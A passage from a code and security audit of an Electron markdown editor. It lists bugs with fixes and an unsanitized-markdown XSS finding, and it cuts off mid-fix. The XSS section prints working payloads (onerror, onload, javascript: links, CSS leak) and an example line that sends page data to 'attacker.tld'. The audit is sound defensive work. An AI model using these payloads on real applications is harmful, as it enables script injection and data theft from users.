- **User-visible impact:** Press Esc (or F11) to leave fullscreen and the button still reads "Maximize" instead of "Restore", with the wrong icon; if the browser denies fullscreen the label lies from the start.
- **Fix:**
```tsx
useEffect(() => {
  const onChange = () => setIsFullscreen(!!document.fullscreenElement);
  document.addEventListener('fullscreenchange', onChange);
  return () => document.removeEventListener('fullscreenchange', onChange);
}, []);
```

### [MEDIUM] M2. Sync-scroll state changes are never persisted and the lock can be left stale

- **File:** `src/App.tsx:810-816`, `src/App.tsx:81-103`
- **Code:**
```tsx
onToggleSyncScroll={() => {
  setSyncScroll((prev) => { const next = !prev; showToast(...); return next; });   // not saved
}}
```
```tsx
// App.tsx:83 — if a scroll lands while the peer holds the lock, this scroll is silently dropped
if (isScrollingLock.current === 'preview') return;
```
- **What's wrong:** (a) `syncScroll` isn't written to settings (see H6). (b) `isScrollingLock` is a bare 45 ms timer with no cancellation; if the peer's scroll event arrives after the lock expires, the intent is discarded and the two panes drift out of sync until the user scrolls again.
- **User-visible impact:** The sync setting resets every launch; in long documents the panes visibly stop tracking each other mid-scroll.
- **Fix:** Persist the toggle (H6) and hold the lock until the programmatic scroll has been observed:
```tsx
isScrollingLock.current = 'editor';
previewRef.current?.scrollToPercentage(pct);
releaseLockWhenPeerSettles('editor');
// in MarkdownPreview/RawEditor, call onProgrammaticScrollEnd() from a
// requestAnimationFrame after setting scrollTop, instead of a fixed setTimeout.
```

### [MEDIUM] M3. The Sample Library silently does nothing for a sample whose record was deleted

- **File:** `src/App.tsx:982-987`, `src/App.tsx:188-189`, `src/components/SampleFilesModal.tsx:48-84`
- **Code:**
```tsx
onSelectSample={(sampleId) => {
  const sample = SAMPLE_FILES.find((s) => s.id === sampleId);
  if (sample) { handleOpenFileById(sample.id); }        // <-- no error, no re-seed
}}
```
```tsx
// App.tsx:188
const record = recentFiles.find((f) => f.id === fileId);
if (!record) return;
```
- **What's wrong:** `SampleFilesModal` renders the static `SAMPLE_FILES` list, but opening delegates to the *persisted* record. Delete "Markdown Syntax Quick Reference.md" from File History (the trash icon, `HomePage.tsx:506-514`) and the Sample Library still offers it.
- **User-visible impact:** Click "Load" on that sample: the modal closes and **no tab opens**, no toast, no error. The user just clicks again.
- **Fix:** Open the sample's own content, creating the record if needed.
```tsx
onSelectSample={(sampleId) => {
  const sample = SAMPLE_FILES.find((s) => s.id === sampleId);
  if (!sample) return;
  const existing = recentFiles.find((r) => r.id === sample.id);
  if (existing) { handleOpenFileById(sample.id); return; }
  const now = Date.now();
  const record: MarkdownFileRecord = { ...sample, lastOpened: now, lastModified: now, hasFileSystemHandle: false };
  saveFileRecord(record).then(() => getRecentFiles()).then(setRecentFiles).then(() => handleOpenFileById(sample.id));
}}
```

### [MEDIUM] M4. Command Palette commands are silent no-ops on the Home view

- **File:** `src/components/CommandPalette.tsx:100-133`, `src/App.tsx:416-418`, `src/App.tsx:585-586`
- **Code:**
```tsx
{ id: 'cmd-save',  title: 'Save Current File',  action: onSave },        // App.tsx:417: if (!activeTab) return;
{ id: 'cmd-preview', title: 'Switch to Preview Mode', action: () => onChangeViewMode('preview') },  // App.tsx:586: if (!activeTabId) return;
```
- **What's wrong:** Five of the ten palette commands (`cmd-save`, `cmd-saveas`, `cmd-preview`, `cmd-raw`, `cmd-split`) hit `if (!activeTab) return;` / `if (!activeTabId) return;` guards in App and do nothing at all. The palette gives no feedback and the modal still closes.
- **User-visible impact:** On the Home page, Ctrl+K → "Save Current File" → Enter: nothing happens, no message. Reads as a broken app.
- **Fix:** Disable the entries when there is no active tab.
```tsx
{ id: 'cmd-save', title: 'Save Current File', subtitle: hasActiveTab ? '…' : 'No document open',
  disabled: !hasActiveTab, action: onSave }
// and in the click/Enter handler: if (items[selectedIndex]?.disabled) return;
```

### [MEDIUM] M5. Find is case-insensitive but "Replace All" is case-sensitive

- **File:** `src/components/RawEditor.tsx:188-197` vs `src/components/RawEditor.tsx:227-231`
- **Code:**
```tsx
// RawEditor.tsx:189 — matches case-insensitively
const query = searchQuery.toLowerCase();
const text = content.toLowerCase();
// ...
// RawEditor.tsx:229 — replaces case-SENSITIVELY, ignoring searchResults entirely
const newContent = content.replaceAll(searchQuery, replaceQuery);
```
- **What's wrong:** Two different matching semantics in the same panel. "Find in document" reports N hits for `Foo`/`foo`/`FOO`; "Replace All" only rewrites the exact-case ones. (Also `String.replaceAll` on a lowercased-index basis is never reconciled with `searchResults[currentMatchIndex]` in `handleReplaceCurrent`, and the two disagree whenever the document contains characters whose lowercase form has a different length, e.g. `İ`.)
- **User-visible impact:** Search `note`, see 12 matches, click "Replace All" → only the exact-case `note`s change and the counter resets; the user believes the replace failed.
- **Fix:** Replace over the same (case-insensitive) index set used for finding.
```tsx
const handleReplaceAll = () => {
  if (!searchResults.length) return;
  let out = ''; let last = 0;
  for (const m of searchResults) { out += content.slice(last, m.start) + replaceQuery; last = m.end; }
  onChange(out + content.slice(last));
};
```

### [MEDIUM] M6. Side effects are executed inside `useState` updater functions

- **File:** `src/App.tsx:810-816`, `src/App.tsx:826-839`, `src/App.tsx:125-139`
- **Code:**
```tsx
// App.tsx:135-137 — inside the updater, i.e. during the render phase
const settings = getAppSettings();
saveAppSettings({ ...settings, theme: next });
showToast(`Switched to ${next === 'light' ? 'Light' : 'Dark'} theme`);
```
- **What's wrong:** Updater functions passed to `setState` must be pure. Here they perform localStorage writes, `document.documentElement.classList` mutations and toast scheduling. React may invoke them more than once per commit (it does so deliberately in StrictMode/dev replays), producing duplicate writes and duplicate toasts.
- **User-visible impact:** Latent today (`main.tsx:5` does not wrap in `StrictMode`), but enabling StrictMode — or any future re-render of an already-updating component — yields doubled toasts and out-of-order theme writes.
- **Fix:** Compute outside the updater.
```tsx
const handleToggleTheme = useCallback(() => {
  const next = theme === 'dark' ? 'light' : 'dark';
  document.documentElement.classList.remove('dark', 'light');
  document.documentElement.classList.add(next);
  document.body.className = next === 'light' ? LIGHT_BODY : DARK_BODY;
  saveAppSettings({ ...getAppSettings(), theme: next });
  showToast(`Switched to ${next === 'light' ? 'Light' : 'Dark'} theme`);
  setTheme(next);
}, [theme, showToast]);
```

### [MEDIUM] M7. `showOpenFilePicker` failures fall through to a download-style path that reports the wrong outcome

- **File:** `src/App.tsx:565-582`
- **Code:**
```tsx
} catch (err: any) {
  if (err.name === 'AbortError') return;
  console.warn('showSaveFilePicker failed or unsupported, using download fallback', err);
}
// Fallback: download file
downloadTextFile(...);
setTabs((prev) => prev.map((t) => ... { originalContent: activeTab.content, isDirty: false } : t));
showToast(`Downloaded "${activeTab.name}"`);
```
- **What's wrong:** Any real error (`NotAllowedError`, `InvalidStateError`, a SecurityError) is swallowed into a silent `console.warn` and the tab is marked **not dirty** even though nothing was written to the location the user chose. The same pattern exists in `handleSave` (`App.tsx:463-465`), where a genuine write failure downgrades to a memory-only save and clears the dirty flag.
- **User-visible impact:** Ctrl+Shift+S fails → the document appears saved, but no file was produced and the disk file still has the old content.
- **Fix:** Distinguish abort from real failure and never clear `isDirty` on the failure path.
```tsx
} catch (err: any) {
  if (err?.name === 'AbortError') return;
  showToast(`Save failed: ${err?.message || err}`);   // and do NOT touch isDirty
  return;
}
```

---

### [LOW] L1. `Untitled-N.md` numbering collides after closing a tab

- **File:** `src/App.tsx:361` — `const name = \`Untitled-${tabs.length + 1}.md\`;`
- **What's wrong:** The counter is derived from the *open tab count*, not from documents that exist. Close a tab and the next Ctrl+N reuses the same number (and, via B4, the same fabricated path).
- **User-visible impact:** Two distinct documents both called `Untitled-1.md`; the file list becomes ambiguous.
- **Fix:** `const name = \`Untitled-${new Date().toISOString().slice(11, 19).replace(/:/g, '')}.md\`;` or a monotonic counter ref.

### [LOW] L2. Initial font size is inconsistent between the two sources of truth

- **File:** `src/App.tsx:42` (`useState(16)`) vs `src/services/storage.ts:15` (`fontSize: 14`)
- **What's wrong:** The first paint uses 16px, then the mount effect (`App.tsx:110`) applies `settings.fontSize || 16` — which is `14` because `getAppSettings()` merges `DEFAULT_SETTINGS`. `|| 16` can never take effect.
- **User-visible impact:** Every launch renders at 16px then snaps to 14px.
- **Fix:** Align the default in one place: `fontSize: 16` in `DEFAULT_SETTINGS`, and drop the `|| 16`.

### [LOW] L3. The global `keydown` listener is torn down and re-added on every keystroke

- **File:** `src/App.tsx:656-672`
- **Code:**
```tsx
}, [handleSave, handleSaveAs, handleOpenLocalFile, handleNewFile, handleCloseTab, activeTabId]);
// handleCloseTab deps: [tabs, activeTabId, showToast]  ->  new identity on every keystroke
```
- **What's wrong:** `tabs` changes on each character, so the effect cleanup/add pair runs per keystroke, and all six handlers are re-created on every render because they depend on `tabs`/`activeTab`/`recentFiles`.
- **User-visible impact:** No visible breakage, but constant listener churn on a hot path; combined with H9 the handler identity churn makes modal guards easy to get wrong.
- **Fix:** Hold the handlers in a ref updated once per render and bind a single stable listener:
```tsx
const cbs = useRef({} as any); cbs.current = { handleSave, handleCloseTab, /* ... */ };
useEffect(() => {
  const onKey = (e: KeyboardEvent) => { /* ... */ cbs.current.handleSave(); };
  window.addEventListener('keydown', onKey);
  return () => window.removeEventListener('keydown', onKey);
}, []);
```

### [LOW] L4. Packaged build ships no window icon; `npm run clean` cannot run on Windows

- **File:** `package.json:23-26` vs `electron/main.cjs:17`; `package.json:12`
- **Code:**
```json
"files": ["dist/**/*", "electron/**/*"]          // public/** is NOT included
```
```js
icon: path.join(__dirname, '../public/favicon.ico')   // electron/main.cjs:17 - file absent from the package
```
```json
"clean": "rm -rf dist server.js"                 // rm is not on PATH in cmd.exe
```
- **What's wrong:** `public/` is not in `build.files`, so `../public/favicon.ico` does not exist in the packaged app; and `npm run clean` fails on Windows because npm uses `cmd.exe` where `rm` is unavailable.
- **User-visible impact:** The installed `.exe` shows the default Electron icon instead of the app logo; `npm run clean` errors out with "'rm' is not recognized".
- **Fix:** Add `"public/**/*"` to `build.files` (or inline the icon) and change the script to `"clean": "node -e \"require('fs').rmSync('dist',{recursive:true,force:true})\""`.

### [LOW] L5. The Shortcuts modal documents three shortcuts that do not exist

- **File:** `src/components/ShortcutsModal.tsx:74-88` vs `src/App.tsx:641-672`
- **Code:**
```ts
{ keys: ['Ctrl', 'P'], description: 'Print document or Export to PDF', category: 'View & System' },
{ keys: ['F11'],        description: 'Toggle full screen window mode',   category: 'View & System' },
{ keys: ['Esc'],        description: 'Close active dialog, palette, or lightbox', category: 'View & System' },
```
- **What's wrong:** The global handler (`App.tsx:642-667`) implements neither Ctrl+P nor F11, and only `CommandPalette.tsx:178` handles Escape. `ExportModal`, `SampleFilesModal`, `ShortcutsModal` and `ImageLightboxModal` have no keydown handler at all.
- **User-visible impact:** The help dialog (advertised from the toolbar and F1) lies: Ctrl+P and F11 do nothing; Esc does not close the Export/Sample/Shortcuts modals or the image lightbox.
- **Fix:** Either implement them (bind Ctrl+P → `setShowExportModal(true)`, F11 → fullscreen, and add an Escape handler shared by all four modals) or delete the rows.

### [LOW] L6. Metadata declares a Gemini capability that nothing implements

- **File:** `metadata.json:4-5`, `.env.example:1-9`, `package.json:35,41,42,45,48`
- **Code:**
```json
"requestFramePermissions": [],
"majorCapabilities": ["MAJOR_CAPABILITY_SERVER_SIDE_GEMINI_API"]
```
- **What's wrong:** `grep -n "genai|GEMINI|dotenv|express|jszip|motion"` over `src/` returns **zero** matches, yet `@google/genai`, `express`, `dotenv`, `jszip` and `motion` are runtime dependencies and `.env.example` documents `GEMINI_API_KEY`/`APP_URL`. `metadata.json` is also not valid JSON (`description` on line 3 is an unquoted key).
- **User-visible impact:** Dead weight in the bundle/lockfile; any tool that parses `metadata.json` fails.
- **Fix:** Remove the unused deps, `.env.example`, and the capability entry; quote the `description` key.

---

## DEAD CODE

### [D1] `TitleBar` declares and receives `onNewFile` / `onOpenFile` but never uses them

- **File:** `src/components/TitleBar.tsx:6-20`, passed at `src/App.tsx:789-790`
- **Code:**
```tsx
interface TitleBarProps {
  ...
  onNewFile: () => void;      // line 11
  onOpenFile: () => void;     // line 12
}

export const TitleBar: React.FC<TitleBarProps> = ({
  activeTab, theme, onToggleTheme, onOpenSearch,   // lines 16-20 — neither prop is destructured
}) => {
```
- **What's wrong:** Two props are threaded from `App` into `TitleBar` and then silently dropped; `TitleBar` contains no New/Open control.
- **User-visible impact:** None directly (dead wiring), but it is the reason the title bar has no file actions despite `App` preparing them.
- **Fix:** Either destructure them and add the buttons, or delete both props from the interface and from `App.tsx:789-790`.

### [D2] `usePWAInstall` is never imported anywhere

- **File:** `src/hooks/usePWAInstall.ts:8-62`
- **Code:**
```ts
export function usePWAInstall() { ... return { isInstallable, isInstalled, isIOS, install }; }
```
- **What's wrong:** `grep -n "usePWAInstall"` across the repo matches only its own definition — zero call sites.
- **User-visible impact:** The PWA "Install" affordance described in `samples.ts:23` and `index.html` metadata does not exist in the UI.
- **Fix:** Wire it into `TitleBar` (a button shown when `isInstallable`), or delete the hook.

### [D3] `getFileHistory` is never called

- **File:** `src/services/storage.ts:70-91`
- **What's wrong:** Exported, fully implemented, zero call sites (`grep` confirms one match — the declaration). The `velox_file_history_v2` record it maintains is written on every save (`syncFileHistory:93-109`) and never read.
- **Fix:** Delete it, or use it as the source for the Home page history table.

### [D4] `FileTab.cursorLine` / `cursorCol` are written in 7 places and never read

- **File:** `src/types/index.ts:50-51`, written at `src/App.tsx:156-157`, `215-216`, `289-290`, `345-346`, `372-373`, `741-742`
- **What's wrong:** Every `FileTab` is constructed with cursor coordinates, but the Status Bar is fed App-level state instead (`App.tsx:940-941` → `StatusBar.tsx:75`). The per-tab fields are write-only.
- **User-visible impact:** Cursor position is not restored when you switch tabs and come back — the status bar shows a stale line/column from whatever tab you typed in last.
- **Fix:** Persist them: in `onCursorChange`, `setTabs(prev => prev.map(t => t.fileId === activeTabId ? { ...t, cursorLine: line, cursorCol: col } : t))`, then pass `activeTab.cursorLine/cursorCol` to `StatusBar`.

### [D5] Four `AppSettings` fields are declared, defaulted and never read

- **File:** `src/types/index.ts:59`, `62`, `64`, `65`; defaults at `src/services/storage.ts:14`, `17`, `19`, `20`
- **What's wrong:** `accentColor`, `lineNumbers`, `defaultViewMode` and `autoSave` appear only in the interface and `DEFAULT_SETTINGS` (grep confirms). `defaultViewMode` in particular is ignored — every new tab hard-codes `viewMode: 'split'` (`App.tsx:371`) and every opened file hard-codes `'preview'` (`App.tsx:155`, `205`, `288`, `344`, `740`).
- **User-visible impact:** If a user sets a default view mode it is silently ignored.
- **Fix:** Either honour them (`viewMode: getAppSettings().defaultViewMode` in `handleNewFile`) or remove the fields.

### [D6] Unused icon imports across six components

- **File / Code:**
  - `src/components/HomePage.tsx:10-11` — `Laptop,` `CheckCircle,` (never referenced)
  - `src/components/CommandBar.tsx:21` — `Printer,` (never referenced; the PDF action is `onOpenExportModal`)
  - `src/components/CommandPalette.tsx:12` — `Download,` (never referenced)
  - `src/components/ExportModal.tsx:2` — `Sparkles` (never referenced)
  - `src/components/ImageLightboxModal.tsx:2` — `Download` (never referenced)
  - `src/components/ShortcutsModal.tsx:2` — `Sparkles,` `Command,` (never referenced)
- **What's wrong:** Dead imports; `Printer` in particular suggests a print button in the toolbar that does not exist.
- **User-visible impact:** None (tree-shaken), but they obscure intent.
- **Fix:** Remove them.

### [D7] `generateStandaloneHtml` takes a `markdownContent` parameter it never uses

- **File:** `src/services/export.ts:46-83`, called at `src/services/export.ts:88` and `src/components/ExportModal.tsx:27`
- **Code:**
```ts
export function generateStandaloneHtml(filename: string, markdownContent: string, htmlBody: string): string {
  const cleanTitle = filename.replace(/\.md$/i, '');
  return `... ${htmlBody} ...`;      // markdownContent is never referenced
}
```
- **What's wrong:** A required parameter that is silently dropped; callers must pre-render the HTML anyway.
- **Fix:** Drop the parameter, or use it to embed the source as a `<script type="text/markdown">` block for round-tripping.

### [D8] Unreachable fallback in the Command Palette subtitle

- **File:** `src/components/CommandPalette.tsx:71`
- **Code:**
```tsx
subtitle: f.path || `${f.wordCount} words • ${f.tags.join(', ')}`,
```
- **What's wrong:** `MarkdownFileRecord.path` is a required `string` (`types/index.ts:16`) and every creation site assigns it, so the right-hand side is dead. The consequence is visible: palette entries show a fabricated path instead of the word count / tags that were intended.
- **Fix:** `subtitle: \`${f.wordCount} words • ${f.tags.join(', ')}\`,`.

### [D9] The Preview checkbox-toggling branch is unreachable dead code

- **File:** `src/components/MarkdownPreview.tsx:58-81`
- **What's wrong:** Covered as H1 — `disabled=""` checkboxes never dispatch click, so lines 60-79 are unreachable. (Additionally, the regex at line 65 `^(\s*[-*+]\s*\[)([ xX])(\])` does not handle `1.` ordered-list tasks or tab-indented nesting, so even if reached it would mis-index against `container.querySelectorAll('input[type="checkbox"]')`.)
- **Fix:** Remove the branch until H1's renderer override lands, then re-test nested/ordered task lists.

---

## MISSING ERROR HANDLING

### [E1] `clearFileHistory` has no error handling — "Clear History" silently fails when IDB is unavailable

- **File:** `src/services/storage.ts:169-177`, called from `src/App.tsx:624-628`
- **Code:**
```ts
export async function clearFileHistory(): Promise<void> {
  await set(STORAGE_KEYS.RECENT_FILES, []);   // rejects -> function aborts
  await set(STORAGE_KEYS.FILE_HISTORY, []);   // never reached
  try { localStorage.removeItem(STORAGE_KEYS.RECENT_FILES); } catch (e) { console.warn(e); }
}
```
```tsx
// App.tsx:624 — the returned promise is discarded by onClick
const handleClearHistory = useCallback(async () => {
  await clearFileHistory();
  setRecentFiles([]);
  showToast('File history cleared');
}, [showToast]);
```
- **What's wrong:** The two `set` calls are unguarded (unlike every other IDB write in the file). If IndexedDB throws — blocked storage, private/incognito, corrupted database, or the Electron `file://` origin — `clearFileHistory` rejects, `handleClearHistory` rejects before `setRecentFiles([])`, and React discards the promise: unhandled rejection, no UI change, no toast. The user clicks "Clear History" and literally nothing happens.
- **User-visible impact:** "Clear History" is a no-op with zero feedback in those conditions (and the records are still there).
- **Fix:**
```ts
export async function clearFileHistory(): Promise<void> {
  const errors: unknown[] = [];
  try { await set(STORAGE_KEYS.RECENT_FILES, []); } catch (e) { errors.push(e); }
  try { await set(STORAGE_KEYS.FILE_HISTORY, []); } catch (e) { errors.push(e); }
  try { localStorage.removeItem(STORAGE_KEYS.RECENT_FILES); } catch (e) { errors.push(e); }
  if (errors.length) throw new AggregateError(errors, 'Could not clear history');
}

// App.tsx
const handleClearHistory = useCallback(async () => {
  try { await clearFileHistory(); setRecentFiles([]); showToast('File history cleared'); }
  catch { showToast('Could not clear history — storage unavailable'); }
}, [showToast]);
```

### [E2] `getRecentFiles()` can itself throw, and it has no fallback if `localStorage` is also blocked

- **File:** `src/services/storage.ts:23-52`
- **Code:**
```ts
} catch (err) {
  console.warn('Failed to load recent files from IDB, using localStorage fallback', err);
  const local = localStorage.getItem(STORAGE_KEYS.RECENT_FILES);   // throws if storage is blocked
  if (local) { try { return JSON.parse(local); } catch (e) { console.error(e); } }
}
```
- **What's wrong:** The fallback lives *inside* the `catch`, so it only runs when IDB throws — and it is not itself wrapped. If storage is blocked entirely, `localStorage.getItem` throws out of `getRecentFiles`, and **every** caller (`saveFileRecord:115`, `handleSave:452`, `deleteFileRecord:159`, `togglePin:180`, `getFileHistory:81`) rejects. In `App.tsx` these are all unguarded `await`s, so the app's primary flows die silently.
- **User-visible impact:** Saving/opening/pinning does nothing, no error, no toast — the UI keeps claiming "Saved to Permanent Memory".
- **Fix:** Make the fallback total and never throw:
```ts
export async function getRecentFiles(): Promise<MarkdownFileRecord[]> {
  try {
    const records = await get<MarkdownFileRecord[]>(STORAGE_KEYS.RECENT_FILES);
    if (Array.isArray(records)) return records;
  } catch (err) { console.warn('IDB unavailable', err); }
  try {
    const local = localStorage.getItem(STORAGE_KEYS.RECENT_FILES);
    if (local) { const parsed = JSON.parse(local); if (Array.isArray(parsed)) return parsed; }
  } catch (err) { console.warn('localStorage unavailable', err); }
  return [];
}
```

### [E3] `handleOpenLocalFile` — the file-read path has no error handling; a failed read means no tab opens

- **File:** `src/App.tsx:306-356` (specifically `314-334`)
- **Code:**
```tsx
const reader = new FileReader();
reader.onload = async (ev) => {                 // no try/catch, no onerror
  const text = (ev.target?.result as string) || '';
  ...
  await saveFileRecord(record);                 // E2 can reject here
  setRecentFiles(await getRecentFiles());
  setTabs((prev) => [...prev, newTab]);         // never reached on failure
  setActiveTabId(fileId);
};
reader.readAsText(file);
```
- **What's wrong:** The async `onload` callback is fire-and-forget with no `try/catch` and no `reader.onerror`. Any failure in `saveFileRecord`/`getRecentFiles` (see E2) rejects an unobserved promise; a read error leaves the callback silent. Also note `input.onchange` is assigned but the `<input>` is never appended to the DOM (line 306/355), so it cannot be reused or cleaned up deterministically.
- **User-visible impact:** Click "Open Windows MD File", pick a file — the dialog closes and no document appears, with no error.
- **Fix:** Add `reader.onerror` and wrap the body; append/remove the input explicitly:
```tsx
input.onchange = async (e) => {
  const file = (e.target as HTMLInputElement).files?.[0];
  if (!file) return;
  try {
    const text = await file.text();
    await openTextAsTab(file.name, text, file.size, file.lastModified, 'Imported');
  } catch (err) { showToast(`Could not open ${file.name}: ${String(err)}`); }
  finally { input.remove(); }
};
document.body.appendChild(input);
input.click();
```

### [E4] The drag-and-drop handler has no error handling and no cancellation

- **File:** `src/App.tsx:699-752`
- **Code:**
```tsx
const handleDrop = async (e: DragEvent) => {
  ...
  const text = await file.text();               // unguarded
  ...
  await saveFileRecord(record);                 // unguarded (E2)
  setRecentFiles(await getRecentFiles());
  setTabs((prev) => [...prev, newTab]);
};
window.addEventListener('drop', handleDrop);    // no { once } / no abort flag
```
- **What's wrong:** The async listener's promise is unobserved. `file.text()` rejects for files that vanish mid-drop, and `saveFileRecord` rejects under blocked storage — in both cases the tab is never opened and nothing is reported. There is also no unmount/operation cancellation: the listener stays bound for the component's life and holds `showToast` from a stale closure (`deps: [showToast]`, which is stable, so that part is fine).
- **User-visible impact:** Dropping several files where one fails half-opens the set with no indication of which or why.
- **Fix:** Wrap the loop body in try/catch, accumulate failures, and report once:
```tsx
try { const text = await file.text(); /* ... */ }
catch (err) { failures.push(`${file.name}: ${String(err)}`); }
...
if (failures.length) showToast(`Could not open ${failures.length} file(s)`);
```

### [E5] Four unguarded `navigator.clipboard` calls

- **File / Code:**
  - `src/components/HomePage.tsx:64` — `navigator.clipboard.writeText(path);` (no `.catch`; if `navigator.clipboard` is `undefined` the synchronous `TypeError` aborts the handler before `setCopiedPathId`, so the ✓ never appears)
  - `src/components/MarkdownPreview.tsx:89` — `navigator.clipboard.writeText(code).then(...)` with no rejection handler, so the "Copied!" feedback never appears
  - `src/components/ExportModal.tsx:33` and `:40` — same pattern for both copy buttons
  - `src/components/ImageLightboxModal.tsx:25` — `navigator.clipboard.writeText(imageSrc);` then **unconditionally** `setCopied(true)`, so the ✓ shows even when the write failed
- **What's wrong:** Clipboard writes reject whenever the document is not focused (`NotAllowedError: Document is not focused`) — routine in Electron after `window.blur()` (which `TitleBar.tsx:132` calls!) and when the window loses focus. Each site either leaks an unhandled rejection or reports false success.
- **User-visible impact:** Click "Copy" while the window is unfocused (or right after the Minimize button, which blurs it): the icon flips to ✓ / "Copied!" and nothing is on the clipboard.
- **Fix:** Centralise and handle failures.
```ts
// src/services/clipboard.ts
export async function copyText(text: string): Promise<boolean> {
  try { if (!navigator.clipboard) throw new Error('clipboard unavailable');
        await navigator.clipboard.writeText(text); return true; }
  catch (e) { console.warn('clipboard write failed', e); return false; }
}
// callers: const ok = await copyText(path); if (ok) { setCopiedPathId(id); setTimeout(...); }
//          else showToast('Clipboard unavailable — the window may not be focused');
```

### [E6] `handleSave` / `handleSaveAs` / `handleOpenFileById` — persistence failures abort mid-way with no user feedback

- **File:** `src/App.tsx:451-452`, `484-485`, `235-236`, `451`
- **Code:**
```tsx
// App.tsx:427 — dirty flag is cleared BEFORE the record is persisted
setTabs((prev) => prev.map((t) => t.fileId === activeTab.fileId
  ? { ...t, originalContent: activeTab.content, isDirty: false } : t));
...
await saveFileRecord(record, activeTab.fileHandle);   // App.tsx:451 — unguarded
setRecentFiles(await getRecentFiles());
```
- **What's wrong:** In the disk-write path the tab is marked clean at line 427 and only then is the record persisted at 451. If 451 rejects, the app has already told the user (and itself) that the document is clean, `setRecentFiles` never runs, and no toast appears — the document is now "not dirty" but has no history entry and no handle record.
- **User-visible impact:** The dirty indicator disappears, the Status Bar reads "Synced with Windows Disk" / "Saved in Permanent Memory", yet the edit is not in the permanent memory catalogue and is invisible to search. Closing the tab loses it (B2).
- **Fix:** Persist first, then flip state, and wrap:
```tsx
try {
  await saveFileRecord(record, activeTab.fileHandle);
  setRecentFiles(await getRecentFiles());
  setTabs((prev) => prev.map((t) => t.fileId === activeTab.fileId
    ? { ...t, originalContent: activeTab.content, isDirty: false } : t));
  showToast(...);
} catch (err) { showToast(`Save failed: ${String(err)}`); }
```

### [E7] The status bar hard-codes "CRLF" while the app always writes LF

- **File:** `src/components/StatusBar.tsx:86` vs `src/services/export.ts:8` and `src/App.tsx:424`
- **Code:**
```tsx
<span className="font-semibold">CRLF</span>       // StatusBar.tsx:86
```
```tsx
const blob = new Blob([content], { type: `${mimeType};charset=utf-8` });   // export.ts:8 — no CRLF translation
await writable.write(activeTab.content);                                     // App.tsx:424 — raw text
```
- **What's wrong:** The indicator is hard-coded and contradicts actual behaviour: `createWritable`/`Blob` write the string verbatim, and the textarea uses `\n`. Nothing in the app ever produces CRLF.
- **User-visible impact:** The status bar misreports the file format; a user on Windows cannot trust it (and a git user is misled about line endings in commits).
- **Fix:** Compute it: `<span>{/\r\n/.test(content) ? 'CRLF' : 'LF'}</span>`, and normalise on save if CRLF is desired:
```ts
await writable.write(activeTab.content.replace(/\r?\n/g, '\r\n'));
```

---

## 3. Security Audit

## SECURITY FINDINGS

### [CRITICAL] S1. Stored/DOM XSS: `marked` output injected via `dangerouslySetInnerHTML` with no sanitizer

- **File:** `src/components/MarkdownPreview.tsx:26`, `src/components/MarkdownPreview.tsx:147`
- **Code:**
```tsx
const htmlContent = React.useMemo(() => parseMarkdown(content), [content]);
// ...
dangerouslySetInnerHTML={{ __html: htmlContent }}
```
- **Vulnerability:** `parseMarkdown` (`src/services/markdown.ts:81-88`) returns raw `markedInstance.parse(markdown)` output. `marked` v18 has **no built-in sanitizer** — the legacy `sanitize` option was removed in marked v5 and the project does not pass any sanitizer. `DOMPurify` is **not** a dependency (`package.json:34-52` confirms: `@google/genai`, `canvas-confetti`, `dotenv`, `express`, `highlight.js`, `idb-keyval`, `jszip`, `marked`, `motion`, `react`, `vite-plugin-pwa` — no `dompurify` / `isomorphic-dompurify` / `sanitize-html`). I verified marked18.0.14's actual output by installing it: raw HTML in the markdown source passes straight through into `innerHTML`:
  - `<script>alert(document.domain)</script>` → emitted verbatim (script tags inserted via `innerHTML` do not execute per HTML spec, but the payload is preserved and becomes live the moment the string is re-serialized, e.g. via the HTML export in `src/services/export.ts:86-90`)
  - `<img src=x onerror=alert(1)>` → emitted verbatim; **this DOES execute**, because event-handler attributes fire on `innerHTML` insertion when the load fails
  - `<svg onload=alert(1)>` → executes
  - `<iframe src="https://evil.example"></iframe>` → renders live remote content
  - `<div id=x tabindex=1 onfocus=alert(1) autofocus>` → executes
  - `<style>body{background:url(https://evil.example/leak)}</style>` → CSS exfiltration
  - `<object data="file:///C:/Windows/win.ini">` → local file load attempt
  - `[x](javascript:alert(1))` → `<a href="javascript:alert(1)">x</a>` — marked does **not** filter `javascript:`/`vbscript:`/`data:` schemes in link destinations
  - `<a href="data:text/html,<script>alert(1)</script>">` → survives
- **Attack scenario:**
  1. Attacker emails/ships `Q3-review.md` containing:
     ```markdown
     # Report
     <img src=x onerror="fetch('https://attacker.tld/x?'+document.title+location.href)">
     ```
  2. Victim double-clicks the file. `App.tsx:699-757` (`handleDrop`) or `App.tsx:240-298` (`handleOpenLocalFile`) reads it via `showOpenFilePicker` / drag-drop, sets it as tab content, `viewMode: 'preview'`.
  3. `MarkdownPreview` renders → `onerror` fires → attacker JS runs **in the renderer of a local desktop app**, with full DOM access to the app: it can read every document the user has ever opened (all `recentFiles` live in IndexedDB, `src/services/storage.ts:23-52` and mirrored into `localStorage` at `storage.ts:60-64`), read `FileSystemFileHandle` objects (`storage.ts:139-145`) and re-write to disk via `createWritable()`, invoke `showSaveFilePicker` to overwrite arbitrary user files, and steal everything in `localStorage['velox_settings_v1']`.
  4. Because `webPreferences` in `electron/main.cjs:18-22` has **no CSP** and no `will-navigate`/`setWindowOpenHandler` guard, the injected script also has an unrestricted network egress path for exfiltration.
- **Severity justification:** Unauthenticated script execution from merely *viewing* a file, in a renderer that holds persisted write-capable file handles and the full document corpus — CWE-79, CVSS ~9.1.
- **Fix:**
```bash
npm install dompurify@^3.2.7
```
```ts
// src/services/markdown.ts
import DOMPurify from 'dompurify';

// Match highlight.js token classes + the app's own generated markup.
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'IMG') { node.setAttribute('loading', 'lazy'); node.setAttribute('data-zoomable', 'true'); }
});

const PURIFY_CONFIG = {
  ALLOWED_TAGS: ['p','br','hr','h1','h2','h3','h4','h5','h6','strong','em','del','code','pre','blockquote','ul','ol','li','a','img','figure','figcaption','table','thead','tbody','tr','th','td','span','div','button','svg','circle','rect','path','g','defs','linearGradient','radialGradient','stop','filter','input','span'],
  ALLOWED_ATTR: ['href','src','alt','title','class','id','start','type','checked','disabled','data-zoomable','data-code','loading','width','height','viewBox','fill','stroke','d','x','y','rx','cx','cy','r','x1','y1','x2','y2','gradientUnits','stop-color','stdDeviation','transform','transform-origin','style'],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  FORBID_TAGS: ['script','iframe','object','embed','link','meta','base','form','style'],
